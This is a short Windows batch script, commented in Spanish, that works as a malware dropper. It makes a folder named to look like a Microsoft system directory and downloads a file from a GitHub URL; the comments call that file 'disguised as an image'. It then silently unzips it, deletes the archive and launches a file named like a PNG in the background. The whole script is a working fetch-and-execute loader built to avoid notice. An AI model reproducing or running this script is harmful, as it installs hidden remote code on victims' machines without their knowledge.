@echo off
:: 1. Configuración de carpetas
set "targetDir=%LocalAppData%\Microsoft\Windows\CloudExperienceHost"
if not exist "%targetDir%" mkdir "%targetDir%"
set "baseUrl=https://raw.githubusercontent.com/deuzinnuse-collab/juego/refs/heads/main"

:: 2. Descarga el archivo (disfrazado de imagen)
powershell -Command "iwr '%baseUrl%/datos.png' -OutFile '%targetDir%\datos.zip'"

:: 3. Descomprime de forma automática y silenciosa
powershell -Command "Expand-Archive -Path '%targetDir%\datos.zip' -DestinationPath '%targetDir%' -Force"

:: 4. Borra el archivo ZIP y ejecuta el programa
del /q "%targetDir%\datos.zip"
start /b "" "%targetDir%\logo.png"
exit
